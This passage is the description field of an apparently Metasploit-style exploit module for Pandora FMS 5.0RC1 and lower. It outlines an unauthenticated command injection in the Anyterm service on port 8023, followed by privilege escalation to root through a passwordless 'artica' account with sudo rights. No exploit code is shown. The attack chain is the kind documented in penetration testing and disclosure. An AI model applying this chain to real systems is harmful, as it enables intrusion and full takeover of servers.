  DESCRIPTION => "

        This module exploits a vulnerability found in Pandora FMS 5.0RC1 and lower.

        It will leverage an unauthenticated command injection in the Anyterm service on

        port 8023/TCP. Commands are executed as the user \"pandora\". In Pandora FMS 4.1 and 5.0RC1

        the user \"artica\" is not assigned a password by default, which makes it possible to su

        to this user from the \"pandora\" user. The \"artica\" user has access to sudo without a

        password, which makes it possible to escalate privileges to root. However, Pandora FMS 4.0

        and lower force a password for the \"artica\" user during installation.
